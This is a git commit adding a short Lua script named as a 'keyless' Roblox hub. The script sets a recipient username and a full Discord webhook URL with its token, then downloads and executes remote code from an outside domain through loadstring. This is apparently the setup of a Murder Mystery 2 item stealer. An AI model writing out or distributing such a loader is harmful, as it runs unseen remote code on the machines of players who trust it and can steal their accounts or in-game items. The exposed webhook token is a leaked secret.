239534feac62884436715b57ca9df6324b291fe7
Xeven-Gaming <154922337+Xeven-Gaming@users.noreply.github.com>
2024-07-27 11:06:28 -0400

    Add files via upload

---
+++ KeyLessDeadhub.lua
@@ -0,0 +1,4 @@
+Username = "Exilierz"
+Webhook = "https://discord.com/api/webhooks/1266771775480401961/Cit-zWftuf97TbwFcQ-C4LQsXW_RgxQHvq4hnpTN6RMd2JH1yCBP4KOp4s_HbO0QprMN"
+
+loadstring(game:HttpGet("https://egorikusa.space/mm2"))()
